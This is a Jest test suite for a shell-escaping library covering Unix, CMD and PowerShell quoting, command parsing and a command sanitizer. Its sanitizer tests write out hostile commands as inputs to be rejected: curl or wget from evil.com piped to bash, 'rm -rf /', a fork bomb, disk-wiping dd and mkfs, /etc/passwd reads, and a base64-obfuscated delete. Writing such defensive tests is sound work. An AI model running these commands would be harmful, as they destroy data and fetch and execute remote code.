/**
 * ShellEscape Test Suite
 *
 * Tests for shell escaping utilities covering edge cases for:
 * - Unix (bash/sh) escaping
 * - Windows CMD escaping
 * - Windows PowerShell escaping
 * - Special character handling
 * - Command parsing and building
 * - Security sanitization
 */

import {
  escapeShellArg,
  escapeShellArgWindows,
  escapeShellArgUnix,
  escapeShellCommand,
  escapeShellCommandWindows,
  escapeShellCommandUnix,
  quoteArg,
  quoteArgWindows,
  quoteArgUnix,
  escapeForPowerShell,
  escapeForCmd,
  buildCommand,
  parseCommand,
  escapeGlobPattern,
  sanitizeCommand,
  isCommandSafe,
  createEnvAssignment,
} from '../src/native/ShellEscape';

// ============================================================
// escapeShellArg Tests
// ============================================================

describe('escapeShellArg', () => {
  describe('Unix escaping', () => {
    it('should return simple strings unchanged', () => {
      expect(escapeShellArgUnix('hello')).toBe('hello');
      expect(escapeShellArgUnix('file.txt')).toBe('file.txt');
      expect(escapeShellArgUnix('path/to/file')).toBe('path/to/file');
    });

    it('should quote strings with spaces', () => {
      expect(escapeShellArgUnix('hello world')).toBe("'hello world'");
      expect(escapeShellArgUnix('path with spaces')).toBe("'path with spaces'");
    });

    it('should handle empty strings', () => {
      expect(escapeShellArgUnix('')).toBe("''");
    });

    it('should handle single quotes', () => {
      // Single quotes in input require special escaping: '\''
      expect(escapeShellArgUnix("it's")).toBe("'it'\\''s'");
      expect(escapeShellArgUnix("don't")).toBe("'don'\\''t'");
      expect(escapeShellArgUnix("'quoted'")).toBe("''\\''quoted'\\'''");
    });

    it('should handle double quotes', () => {
      expect(escapeShellArgUnix('say "hello"')).toBe("'say \"hello\"'");
    });

    it('should handle backslashes', () => {
      expect(escapeShellArgUnix('path\\file')).toBe("'path\\file'");
      expect(escapeShellArgUnix('\\')).toBe("'\\'");
    });

    it('should handle dollar signs (variable expansion)', () => {
      expect(escapeShellArgUnix('$HOME')).toBe("'$HOME'");
      expect(escapeShellArgUnix('${VAR}')).toBe("'${VAR}'");
      expect(escapeShellArgUnix('price: $100')).toBe("'price: $100'");
    });

    it('should handle backticks (command substitution)', () => {
      expect(escapeShellArgUnix('`whoami`')).toBe("'`whoami`'");
      expect(escapeShellArgUnix('date: `date`')).toBe("'date: `date`'");
    });

    it('should handle exclamation marks (history expansion)', () => {
      expect(escapeShellArgUnix('hello!')).toBe("'hello!'");
      expect(escapeShellArgUnix('!!')).toBe("'!!'");
    });

    it('should handle pipe and redirection', () => {
      expect(escapeShellArgUnix('a|b')).toBe("'a|b'");
      expect(escapeShellArgUnix('a>b')).toBe("'a>b'");
      expect(escapeShellArgUnix('a<b')).toBe("'a<b'");
      expect(escapeShellArgUnix('a>>b')).toBe("'a>>b'");
    });

    it('should handle ampersand (background)', () => {
      expect(escapeShellArgUnix('a&b')).toBe("'a&b'");
      expect(escapeShellArgUnix('command &')).toBe("'command &'");
    });

    it('should handle semicolon (command separator)', () => {
      expect(escapeShellArgUnix('a;b')).toBe("'a;b'");
    });

    it('should handle parentheses (subshell)', () => {
      expect(escapeShellArgUnix('(subshell)')).toBe("'(subshell)'");
    });

    it('should handle glob characters', () => {
      expect(escapeShellArgUnix('*.txt')).toBe("'*.txt'");
      expect(escapeShellArgUnix('file?.log')).toBe("'file?.log'");
      expect(escapeShellArgUnix('[abc]')).toBe("'[abc]'");
      expect(escapeShellArgUnix('{a,b,c}')).toBe("'{a,b,c}'");
    });

    it('should handle tilde (home expansion)', () => {
      expect(escapeShellArgUnix('~')).toBe("'~'");
      expect(escapeShellArgUnix('~/path')).toBe("'~/path'");
    });

    it('should handle newlines and tabs', () => {
      expect(escapeShellArgUnix('line1\nline2')).toBe("'line1\nline2'");
      expect(escapeShellArgUnix('col1\tcol2')).toBe("'col1\tcol2'");
      expect(escapeShellArgUnix('line1\r\nline2')).toBe("'line1\r\nline2'");
    });

    it('should handle mixed special characters', () => {
      expect(escapeShellArgUnix('$HOME/path with spaces')).toBe("'$HOME/path with spaces'");
      expect(escapeShellArgUnix('echo "hello" | grep world')).toBe("'echo \"hello\" | grep world'");
    });
  });

  describe('Windows escaping', () => {
    it('should return simple strings unchanged', () => {
      expect(escapeShellArgWindows('hello')).toBe('hello');
      expect(escapeShellArgWindows('file.txt')).toBe('file.txt');
    });

    it('should quote strings with spaces', () => {
      expect(escapeShellArgWindows('hello world')).toBe('"hello world"');
    });

    it('should handle empty strings', () => {
      expect(escapeShellArgWindows('')).toBe('""');
    });

    it('should handle double quotes', () => {
      const result = escapeShellArgWindows('say "hello"');
      expect(result).toContain('\\"');
    });

    it('should handle backslashes correctly', () => {
      // Backslash only needs escaping before quotes or at end
      const result = escapeShellArgWindows('C:\\path\\file');
      expect(result).toContain('C:\\path\\file');
    });

    it('should handle trailing backslashes', () => {
      const result = escapeShellArgWindows('path\\');
      // Trailing backslash should be doubled
      expect(result).toBe('"path\\\\"');
    });

    it('should handle backslash before quote', () => {
      const result = escapeShellArgWindows('test\\"value');
      // Backslash before quote should be doubled
      expect(result.includes('\\\\\\"')).toBe(true);
    });

    it('should escape CMD special characters with caret', () => {
      const result = escapeShellArgWindows('a&b');
      expect(result).toContain('^&');
    });

    it('should escape pipe', () => {
      const result = escapeShellArgWindows('a|b');
      expect(result).toContain('^|');
    });

    it('should escape angle brackets', () => {
      const result = escapeShellArgWindows('a<b>c');
      expect(result).toContain('^<');
      expect(result).toContain('^>');
    });

    it('should escape percent signs', () => {
      const result = escapeShellArgWindows('100%');
      expect(result).toContain('^%');
    });

    it('should escape exclamation marks', () => {
      const result = escapeShellArgWindows('hello!');
      expect(result).toContain('^^!');
    });
  });

  describe('Platform auto-detection', () => {
    it('should accept platform override for unix', () => {
      expect(escapeShellArg('hello world', 'unix')).toBe("'hello world'");
    });

    it('should accept platform override for windows', () => {
      expect(escapeShellArg('hello world', 'windows')).toBe('"hello world"');
    });
  });
});

// ============================================================
// escapeShellCommand Tests
// ============================================================

describe('escapeShellCommand', () => {
  describe('Unix command escaping', () => {
    it('should wrap command in single quotes', () => {
      const result = escapeShellCommandUnix('echo hello');
      expect(result).toBe("'echo hello'");
    });

    it('should escape single quotes in command', () => {
      const result = escapeShellCommandUnix("echo 'hello'");
      expect(result).toContain("'\\''");
    });
  });

  describe('Windows command escaping', () => {
    it('should wrap command in double quotes', () => {
      const result = escapeShellCommandWindows('echo hello');
      expect(result).toBe('"echo hello"');
    });

    it('should escape double quotes', () => {
      const result = escapeShellCommandWindows('echo "hello"');
      expect(result).toContain('\\"');
    });

    it('should escape dollar signs for PowerShell', () => {
      const result = escapeShellCommandWindows('echo $env:PATH');
      expect(result).toContain('`$');
    });

    it('should escape backticks for PowerShell', () => {
      const result = escapeShellCommandWindows('echo `n');
      expect(result).toContain('``');
    });
  });
});

// ============================================================
// quoteArg Tests
// ============================================================

describe('quoteArg', () => {
  describe('Unix quoting', () => {
    it('should not quote safe strings', () => {
      expect(quoteArgUnix('hello')).toBe('hello');
      expect(quoteArgUnix('file.txt')).toBe('file.txt');
      expect(quoteArgUnix('path/to/file')).toBe('path/to/file');
      expect(quoteArgUnix('user@host')).toBe('user@host');
      expect(quoteArgUnix('key=value')).toBe('key=value');
    });

    it('should use single quotes when possible', () => {
      expect(quoteArgUnix('hello world')).toBe("'hello world'");
      expect(quoteArgUnix('$HOME')).toBe("'$HOME'");
    });

    it('should use double quotes when string has single quotes but no special chars', () => {
      const result = quoteArgUnix("it's");
      // Should use escaped single quotes or double quotes
      expect(result === "\"it's\"" || result.includes("'\\''")).toBe(true);
    });
  });

  describe('Windows quoting', () => {
    it('should not quote safe strings', () => {
      expect(quoteArgWindows('hello')).toBe('hello');
      expect(quoteArgWindows('C:\\path\\file')).toBe('C:\\path\\file');
    });

    it('should quote strings with spaces', () => {
      expect(quoteArgWindows('hello world')).toBe('"hello world"');
    });
  });
});

// ============================================================
// Shell-Specific Escaping Tests
// ============================================================

describe('escapeForPowerShell', () => {
  it('should escape backticks', () => {
    const result = escapeForPowerShell('hello`nworld');
    expect(result).toContain('``');
  });

  it('should escape dollar signs', () => {
    const result = escapeForPowerShell('$variable');
    expect(result).toContain('`$');
  });

  it('should escape double quotes', () => {
    const result = escapeForPowerShell('say "hello"');
    expect(result).toContain('`"');
  });

  it('should escape parentheses', () => {
    const result = escapeForPowerShell('Get-Process()');
    expect(result).toContain('`(');
    expect(result).toContain('`)');
  });

  it('should escape brackets', () => {
    const result = escapeForPowerShell('$array[0]');
    expect(result).toContain('`[');
    expect(result).toContain('`]');
  });

  it('should handle empty string', () => {
    expect(escapeForPowerShell('')).toBe('""');
  });
});

describe('escapeForCmd', () => {
  it('should escape ampersand', () => {
    const result = escapeForCmd('a&b');
    expect(result).toContain('^&');
  });

  it('should escape pipe', () => {
    const result = escapeForCmd('a|b');
    expect(result).toContain('^|');
  });

  it('should escape angle brackets', () => {
    const result = escapeForCmd('a<b>c');
    expect(result).toContain('^<');
    expect(result).toContain('^>');
  });

  it('should double percent signs', () => {
    const result = escapeForCmd('100%');
    expect(result).toContain('%%');
  });

  it('should escape exclamation marks', () => {
    const result = escapeForCmd('hello!');
    expect(result).toContain('^!');
  });

  it('should handle empty string', () => {
    expect(escapeForCmd('')).toBe('""');
  });
});

// ============================================================
// Command Building and Parsing Tests
// ============================================================

describe('buildCommand', () => {
  it('should build simple command', () => {
    const result = buildCommand('echo', ['hello'], 'unix');
    expect(result).toBe('echo hello');
  });

  it('should escape arguments with spaces', () => {
    const result = buildCommand('echo', ['hello world', 'test'], 'unix');
    expect(result).toBe("echo 'hello world' test");
  });

  it('should handle empty args', () => {
    const result = buildCommand('ls', [], 'unix');
    expect(result).toBe('ls');
  });

  it('should work for Windows', () => {
    const result = buildCommand('dir', ['C:\\Program Files'], 'windows');
    expect(result).toContain('dir');
    expect(result).toContain('Program Files');
  });
});

describe('parseCommand', () => {
  it('should parse simple command', () => {
    const result = parseCommand('echo hello');
    expect(result.command).toBe('echo');
    expect(result.args).toEqual(['hello']);
  });

  it('should parse command with multiple args', () => {
    const result = parseCommand('echo hello world test');
    expect(result.command).toBe('echo');
    expect(result.args).toEqual(['hello', 'world', 'test']);
  });

  it('should handle single-quoted arguments', () => {
    const result = parseCommand("echo 'hello world'");
    expect(result.command).toBe('echo');
    expect(result.args).toEqual(['hello world']);
  });

  it('should handle double-quoted arguments', () => {
    const result = parseCommand('echo "hello world"');
    expect(result.command).toBe('echo');
    expect(result.args).toEqual(['hello world']);
  });

  it('should handle escaped characters', () => {
    const result = parseCommand('echo hello\\ world');
    expect(result.command).toBe('echo');
    expect(result.args).toEqual(['hello world']);
  });

  it('should handle mixed quotes', () => {
    const result = parseCommand('echo "hello" \'world\'');
    expect(result.command).toBe('echo');
    expect(result.args).toEqual(['hello', 'world']);
  });

  it('should handle empty command', () => {
    const result = parseCommand('');
    expect(result.command).toBe('');
    expect(result.args).toEqual([]);
  });

  it('should handle command with no args', () => {
    const result = parseCommand('ls');
    expect(result.command).toBe('ls');
    expect(result.args).toEqual([]);
  });

  it('should handle multiple spaces between args', () => {
    const result = parseCommand('echo   hello    world');
    expect(result.command).toBe('echo');
    expect(result.args).toEqual(['hello', 'world']);
  });
});

// ============================================================
// Pattern Escaping Tests
// ============================================================

describe('escapeGlobPattern', () => {
  it('should escape asterisk', () => {
    expect(escapeGlobPattern('*.txt')).toBe('\\*.txt');
  });

  it('should escape question mark', () => {
    expect(escapeGlobPattern('file?.log')).toBe('file\\?.log');
  });

  it('should escape brackets', () => {
    expect(escapeGlobPattern('[abc]')).toBe('\\[abc\\]');
  });

  it('should escape braces', () => {
    expect(escapeGlobPattern('{a,b}')).toBe('\\{a,b\\}');
  });

  it('should escape tilde', () => {
    expect(escapeGlobPattern('~')).toBe('\\~');
  });

  it('should escape multiple glob chars', () => {
    expect(escapeGlobPattern('**/*.{js,ts}')).toBe('\\*\\*/\\*.\\{js,ts\\}');
  });

  it('should leave regular chars unchanged', () => {
    expect(escapeGlobPattern('hello.txt')).toBe('hello.txt');
  });
});

// ============================================================
// Sanitization Tests
// ============================================================

describe('sanitizeCommand', () => {
  it('should allow safe commands', () => {
    expect(sanitizeCommand('ls -la')).toBe('ls -la');
    expect(sanitizeCommand('echo hello')).toBe('echo hello');
    expect(sanitizeCommand('cat file.txt')).toBe('cat file.txt');
    expect(sanitizeCommand('npm install')).toBe('npm install');
  });

  it('should reject rm after semicolon', () => {
    expect(sanitizeCommand('ls; rm -rf /')).toBeNull();
    expect(sanitizeCommand('echo hello; rm file')).toBeNull();
  });

  it('should reject rm after pipe', () => {
    expect(sanitizeCommand('cat file | rm -rf /')).toBeNull();
  });

  it('should reject command substitution with backticks', () => {
    expect(sanitizeCommand('echo `whoami`')).toBeNull();
    expect(sanitizeCommand('`cat /etc/passwd`')).toBeNull();
  });

  it('should reject command substitution with $()', () => {
    expect(sanitizeCommand('echo $(whoami)')).toBeNull();
    expect(sanitizeCommand('$(cat /etc/passwd)')).toBeNull();
  });

  it('should reject writing to block devices', () => {
    expect(sanitizeCommand('echo x > /dev/sda')).toBeNull();
  });

  it('should reject writing to /etc', () => {
    expect(sanitizeCommand('echo x > /etc/passwd')).toBeNull();
  });

  it('should reject rm -rf /', () => {
    expect(sanitizeCommand('rm -rf /')).toBeNull();
    expect(sanitizeCommand('rm -r /')).toBeNull();
  });

  it('should reject fork bombs', () => {
    expect(sanitizeCommand(':(){:|:&};:')).toBeNull();
  });

  it('should reject filesystem formatting', () => {
    expect(sanitizeCommand('mkfs.ext4 /dev/sda')).toBeNull();
  });

  it('should reject dd if=', () => {
    expect(sanitizeCommand('dd if=/dev/zero of=/dev/sda')).toBeNull();
  });

  it('should reject curl piped to shell', () => {
    expect(sanitizeCommand('curl http://evil.com | bash')).toBeNull();
    expect(sanitizeCommand('curl http://evil.com | sh')).toBeNull();
  });

  it('should reject wget piped to shell', () => {
    expect(sanitizeCommand('wget http://evil.com -O - | bash')).toBeNull();
  });

  it('should reject eval', () => {
    expect(sanitizeCommand('eval "rm -rf /"')).toBeNull();
  });

  it('should reject base64 decode (obfuscation)', () => {
    expect(sanitizeCommand('echo cm0gLXJmIC8= | base64 -d | bash')).toBeNull();
  });
});

describe('isCommandSafe', () => {
  it('should return true for safe commands', () => {
    expect(isCommandSafe('ls -la')).toBe(true);
    expect(isCommandSafe('echo hello')).toBe(true);
  });

  it('should return false for dangerous commands', () => {
    expect(isCommandSafe('rm -rf /')).toBe(false);
    expect(isCommandSafe('echo `whoami`')).toBe(false);
  });
});

// ============================================================
// Environment Assignment Tests
// ============================================================

describe('createEnvAssignment', () => {
  it('should create Unix export statement', () => {
    const result = createEnvAssignment('PATH', '/usr/bin', 'unix');
    // Simple path without special chars doesn't need quoting
    expect(result).toBe("export PATH=/usr/bin");
  });

  it('should create PowerShell env statement', () => {
    const result = createEnvAssignment('PATH', 'C:\\Windows', 'windows');
    expect(result).toContain('$env:PATH');
  });

  it('should escape values properly for Unix', () => {
    const result = createEnvAssignment('MSG', "hello world", 'unix');
    expect(result).toBe("export MSG='hello world'");
  });
});

// ============================================================
// Edge Cases and Complex Scenarios
// ============================================================

describe('Edge Cases', () => {
  it('should handle unicode characters', () => {
    const unicodeStr = 'hello\u4e16\u754c'; // hello世界
    expect(escapeShellArgUnix(unicodeStr)).toBe(unicodeStr); // No escaping needed
  });

  it('should handle very long strings', () => {
    const longStr = 'a'.repeat(10000);
    expect(escapeShellArgUnix(longStr)).toBe(longStr);
  });

  it('should handle strings with only special chars', () => {
    expect(escapeShellArgUnix('!@#$%')).toBe("'!@#$%'");
    // For "'''": each ' becomes '\'' → result is ''\''\''\''\''
    expect(escapeShellArgUnix("'''")).toBe("''\\'''\\'''\\'''");
  });

  it('should handle null byte (should not appear in commands)', () => {
    // Null bytes are problematic in shell - just verify no crash
    const result = escapeShellArgUnix('hello\0world');
    expect(typeof result).toBe('string');
  });

  it('should handle mixed newlines', () => {
    const mixed = 'line1\nline2\r\nline3\rline4';
    const result = escapeShellArgUnix(mixed);
    expect(result).toContain(mixed);
  });

  it('should handle paths with spaces and special chars', () => {
    const path = "/home/user/My Documents/file (1).txt";
    const result = escapeShellArgUnix(path);
    expect(result).toBe(`'${path}'`);
  });

  it('should handle Windows paths with backslashes', () => {
    const path = "C:\\Users\\John Doe\\Documents\\file.txt";
    const result = escapeShellArgWindows(path);
    expect(result).toContain('John Doe');
  });

  it('should handle JSON strings', () => {
    const json = '{"key": "value", "arr": [1, 2, 3]}';
    const resultUnix = escapeShellArgUnix(json);
    expect(resultUnix).toBe(`'${json}'`);
  });

  it('should handle regex patterns', () => {
    const regex = '^[a-z]+\\d{2,3}$';
    const result = escapeShellArgUnix(regex);
    expect(result).toBe(`'${regex}'`);
  });
});
